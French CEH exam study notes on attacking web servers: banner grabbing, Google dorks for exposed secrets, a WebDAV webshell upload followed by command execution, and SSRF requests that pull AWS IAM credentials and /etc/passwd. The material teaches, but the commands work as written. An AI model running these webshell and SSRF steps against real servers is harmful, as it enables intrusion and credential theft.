# 🔴 Module 13 — Techniques Avancées : Hacking Web Servers

> **CEH v13 | EC-Council**  
> `#BannerGrabbing` `#WebDAV` `#SSRF` `#Fingerprinting` `#GoogleDorking`

---

## 📌 Table des matières

1. [Banner Grabbing et Fingerprinting](#1-banner-grabbing)
2. [Google Dorking pour reconnaissance](#2-google-dorking)
3. [WebDAV — Exploitation](#3-webdav)
4. [SSRF — Server-Side Request Forgery](#4-ssrf)
5. [DNS Attacks sur serveurs web](#5-dns-attacks)
6. [robots.txt et sitemap.xml](#6-robotstxt)

---

## 1. Banner Grabbing et Fingerprinting

Identifier le type et la version du serveur web pour cibler des exploits.

### Méthodes actives

```bash
# Telnet (banner grabbing basique) :
telnet target.com 80
HEAD / HTTP/1.1
Host: target.com
                        ← Appuyer Entrée 2 fois

# Réponse :
HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)
X-Powered-By: PHP/7.2.24

# Netcat :
echo -e "HEAD / HTTP/1.0\n\n" | nc target.com 80

# curl :
curl -I http://target.com
curl -v http://target.com 2>&1 | grep -i server
```

### Nmap fingerprinting

```bash
# Détection de version et OS :
nmap -sV -p 80,443,8080 target.com
nmap -A target.com                      # Agressif : OS, version, scripts

# Scripts NSE pour serveurs web :
nmap --script http-server-header target.com
nmap --script http-title target.com
nmap --script http-methods target.com   # Méthodes HTTP activées
nmap --script http-enum target.com      # Énumération de répertoires
nmap --script http-headers target.com   # Headers de réponse
```

---

## 2. Google Dorking pour Reconnaissance

Utiliser les opérateurs de recherche Google pour trouver des informations sur un serveur cible.

```
Opérateurs essentiels :
  site:target.com           → Toutes les pages indexées
  intitle:"Index of"        → Répertoires avec listing activé
  inurl:admin               → Pages d'administration
  filetype:php inurl:config → Fichiers de configuration PHP
  
Dorks puissants pour web servers :
  site:target.com filetype:sql         → Fichiers SQL exposés
  site:target.com ext:bak              → Fichiers de backup
  site:target.com inurl:.git           → Repos Git exposés
  intitle:"Index of" "/.env"           → Fichiers .env exposés
  intitle:"Apache Tomcat" "Manager"    → Console Tomcat ouverte
  inurl:"/phpinfo.php"                 → phpinfo() exposé
  intitle:"IIS Windows Server"         → Serveurs IIS par défaut
  
  "Server: Apache/2.4.29" site:target.com  → Trouver la version exacte
```

---

## 3. WebDAV — Exploitation

WebDAV (Web Distributed Authoring and Versioning) est une extension HTTP permettant la gestion de fichiers.

```bash
# Vérifier si WebDAV est activé :
curl -X OPTIONS http://target.com -v
# Réponse avec PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, MOVE = WebDAV actif

# Scanner WebDAV :
nmap --script http-webdav-scan target.com

# Davtest — tester les types de fichiers uploadables :
davtest -url http://target.com/webdav/

# Résultat davtest :
PUT  txt    : SUCCEED ✓
PUT  html   : SUCCEED ✓
PUT  php    : SUCCEED ✓   ← Upload de webshell PHP possible !
PUT  asp    : SUCCEED ✓

# Cadaver — client WebDAV interactif :
cadaver http://target.com/webdav/
dav:/webdav/> put shell.php     # Uploader un webshell
dav:/webdav/> ls                # Lister les fichiers
dav:/webdav/> get secretfile.txt # Télécharger un fichier

# Accéder au webshell :
curl http://target.com/webdav/shell.php?cmd=whoami
```

---

## 4. SSRF — Server-Side Request Forgery

SSRF force le serveur à effectuer des requêtes HTTP vers une destination contrôlée par l'attaquant.

```
Architecture typique :

INTERNET → [Web App] → [Réseau interne] → [Services internes]
                              ↑
                    Cloud metadata services
                    (169.254.169.254)

Exploitation :
1. Paramètre URL vulnérable :
   https://site.com/fetch?url=http://169.254.169.254/latest/meta-data/

2. Le serveur contacte le metadata service AWS :
   → Retourne les credentials IAM !
   
3. Autres cibles SSRF intéressantes :
   http://localhost/admin        → Interface admin interne
   http://192.168.1.1/           → Routeur interne
   http://10.0.0.5:5432/         → PostgreSQL interne
   file:///etc/passwd            → Lecture de fichier local
   dict://localhost:11211/       → Memcached interne
```

```bash
# Test SSRF avec AWS metadata :
curl https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Test SSRF avec lecture de fichier :
curl "https://target.com/preview?url=file:///etc/passwd"
```

---

## 5. DNS Attacks sur Serveurs Web

```
DNS Hijacking :
  Modifier les enregistrements DNS pour rediriger le trafic
  Résultat : trafic légitime → serveur attaquant
  
DNS Cache Poisoning :
  Empoisonner le cache du résolveur DNS récursif
  Résultat : les clients obtiennent de fausses IP pour target.com

Domain Hijacking :
  Prendre le contrôle du nom de domaine (compromission registrar)
  Résultat : contrôle total du DNS, certificats, mail
  
Subdomain Takeover :
  Un sous-domaine pointe vers un service cloud tiers désactivé
  L'attaquant recréé le service et contrôle le sous-domaine
  Exemple : blog.target.com → CNAME → removed-site.github.io
```

---

## 6. robots.txt et sitemap.xml

```
robots.txt révèle souvent des chemins "cachés" :

User-agent: *
Disallow: /admin/           ← Paneau d'administration !
Disallow: /backup/          ← Dossier de backup !
Disallow: /internal/        ← Zone interne !
Disallow: /api/v1/users     ← Endpoint API !

→ Un attaquant lit robots.txt en PREMIER pour identifier les cibles

# Accès direct :
curl http://target.com/robots.txt
curl http://target.com/sitemap.xml

# Dans Nikto et gobuster, ces fichiers sont analysés automatiquement
```

---

## 🧠 Points clés à retenir pour l'examen

- **Banner grabbing** = identifier version serveur via HTTP headers
- **Telnet/Netcat** + port 80 = méthode manuelle de banner grabbing
- **WebDAV** activé + PUT = upload de webshell possible
- **SSRF** = forcer le serveur à interroger des ressources internes ou metadata cloud
- **robots.txt** révèle souvent les chemins cachés (contre-productif si mal utilisé)
- **Google Dorking** = `intitle:"Index of"`, `filetype:php`, `site:target`

---

*⬅️ [Vecteurs d'attaque](./02_vecteurs_attaque.md) | ➡️ [Outils et Labs](./04_outils_et_labs.md)*
